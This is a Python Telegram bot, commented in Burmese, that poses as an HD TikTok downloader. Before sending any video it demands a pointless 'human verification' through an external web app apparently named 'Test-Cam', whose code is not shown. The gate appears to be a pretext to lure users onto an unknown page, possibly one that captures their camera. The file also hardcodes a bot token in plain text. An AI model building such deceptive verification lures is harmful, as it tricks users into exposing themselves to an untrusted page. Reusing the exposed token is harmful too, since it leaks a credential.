import telebot
import requests
from telebot import types

BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
WEB_APP_URL = "https://tar-alt.github.io/Test-Cam/" 

bot = telebot.TeleBot(BOT_TOKEN)
# အသုံးပြုသူတိုင်းအတွက် link ကို မှတ်ထားရန် dictionary
pending_videos = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_tiktok(message):
    user_id = message.chat.id
    # Link ကို သေချာသိမ်းထားမယ်
    pending_videos[user_id] = message.text 
    
    markup = types.InlineKeyboardMarkup()
    web_app = types.WebAppInfo(url=WEB_APP_URL)
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", web_app=web_app)
    markup.add(verify_btn)
    
    bot.reply_to(message, "⚠️ *Verification Required*\n\nလူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "✅ Verification_Success")
def process_download(message):
    user_id = message.chat.id
    
    # ၁။ Success စာကြောင်းကို ချက်ချင်းဖျက်မယ်
    try:
        bot.delete_message(user_id, message.message_id)
    except:
        pass

    # ၂။ သိမ်းထားတဲ့ link ရှိမရှိ စစ်မယ်
    if user_id in pending_videos:
        video_link = pending_videos[user_id]
        status_msg = bot.send_message(user_id, "🚀 Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
        
        try:
            # TikTok Downloader API (TikWM) ကို သုံးထားပါတယ်
            api_url = f"https://www.tikwm.com/api/?url={video_link}&hd=1"
            res = requests.get(api_url).json()
            
            if res.get('code') == 0:
                video_url = res['data'].get('play') # Watermark မပါတဲ့ HD ဗီဒီယို
                bot.send_video(
                    user_id, 
                    video_url, 
                    caption="✅ *Download Successful!*",
                    parse_mode="Markdown"
                )
                bot.delete_message(user_id, status_msg.message_id)
            else:
                bot.edit_message_text("❌ ဗီဒီယို ရှာမတွေ့ပါ။ Link ကို ပြန်စစ်ပါ။", user_id, status_msg.message_id)
        except Exception as e:
            bot.edit_message_text(f"⚠️ စနစ်ချို့ယွင်းချက် ရှိနေပါသည်။", user_id, status_msg.message_id)
        
        # ပို့ပြီးရင် မှတ်ထားတဲ့ link ကို ဖျက်မယ်
        del pending_videos[user_id]
    else:
        bot.send_message(user_id, "⚠️ Link အရင်ပို့ပေးပါ။")

bot.infinity_polling()
